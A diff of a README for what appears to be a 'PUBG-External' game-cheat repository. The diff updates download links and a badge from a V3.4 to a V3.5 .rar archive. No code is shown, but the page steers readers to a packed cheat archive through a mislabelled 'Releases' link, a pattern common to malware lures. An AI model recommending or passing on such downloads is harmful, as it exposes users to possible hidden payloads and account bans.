@@ -31,11 +31,11 @@
 
 ---
 
-### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.4/PUBG.V3.4.rar)
+### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.5/PUBG.V3.5.rar)
 
-Get the latest release from the **[Releases](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.4/PUBG.V3.4.rar)** tab.
+Get the latest release from the **[Releases](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.5/PUBG.V3.5.rar)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.4/PUBG.V3.4.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.5/PUBG.V3.5.rar)
 
 ---
 
